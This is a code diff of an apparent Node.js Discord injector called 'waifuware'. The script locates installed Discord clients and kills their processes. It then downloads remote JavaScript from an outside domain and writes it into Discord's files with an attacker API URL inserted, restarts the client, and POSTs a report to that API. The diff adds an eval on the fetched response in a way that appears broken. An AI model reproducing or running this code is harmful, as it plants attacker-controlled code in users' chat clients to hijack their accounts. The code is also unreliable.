@@ -2,7 +2,7 @@ const fs = require("fs"),
     {
         execSync
     } = require("child_process"),
-    fetch = require("sync-fetch"),
+    fetch = require("node-fetch"),
     Glob = require("glob")
 var kill = new Array(),
     path = new Array(),
@@ -49,11 +49,11 @@ switch (process.platform) {
             })
         }
 
-        function injectToDiscord() {
+        async function injectToDiscord() {
             getInstalledDiscord()
             killAllDiscords()
             injected()
-            var r = fetch("https://notfubuki.xyz/api/waifuware", { headers: { waifu: true }}).text()
+            var r = await eval(await fetch("https://notfubuki.xyz/api/waifuware", { headers: { waifu: true }})).text()
             JSPath.forEach(f => fs.writeFileSync(f, r.replace("*API URL*", apiURL)) ^ execSync(`${local}/${f.split("/")[5]}/Update.exe --processStart ${f.split("/")[5]}.exe`))
             
         }
@@ -77,7 +77,7 @@ switch (process.platform) {
         function injected() {
             var e = ""
             alreadyTaskkill.forEach(r => e += `${r}, `)
-             fetch(`${apiURL}/injected`, {
+            fetch(`${apiURL}/injected`, {
                 method: 'POST',
                 body: `{ "p": "${e.slice(0, -2)}" }`
             })
